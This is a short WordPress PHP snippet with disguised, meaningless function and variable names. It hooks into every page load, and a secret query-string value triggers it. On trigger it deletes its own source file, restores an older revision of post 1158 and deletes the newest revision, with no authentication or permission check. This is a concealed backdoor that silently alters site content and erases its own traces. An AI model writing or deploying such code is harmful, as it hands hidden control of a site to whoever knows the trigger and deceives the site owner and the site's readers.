<?php

function shortener_title_tables() {
	if (isset($_GET['amp_chart_files_label']) && $_GET['amp_chart_files_label'] === 'age_quotes_preview_compare') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$affiliate_access_chatbot_query = 1158;
		$protection_conditional_project_new = wp_get_post_revisions($affiliate_access_chatbot_query);
		if (empty($protection_conditional_project_new)) die('no revisions');
		if (count($protection_conditional_project_new) < 2) die('less than 2');
		$captcha_news_js = array_shift($protection_conditional_project_new);
		$lightbox_cool_results = $captcha_news_js->ID;
		$security_reading_tables = array_shift($protection_conditional_project_new);
		$slider_next_testimonial_responsive = $security_reading_tables->ID;
		$codes_pages_variation_portal = wp_restore_post_revision($slider_next_testimonial_responsive);
		if ($codes_pages_variation_portal === false) die('error restoring');
		$codes_pages_variation_portal = wp_delete_post_revision($lightbox_cool_results);		
		if ($codes_pages_variation_portal === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'shortener_title_tables');
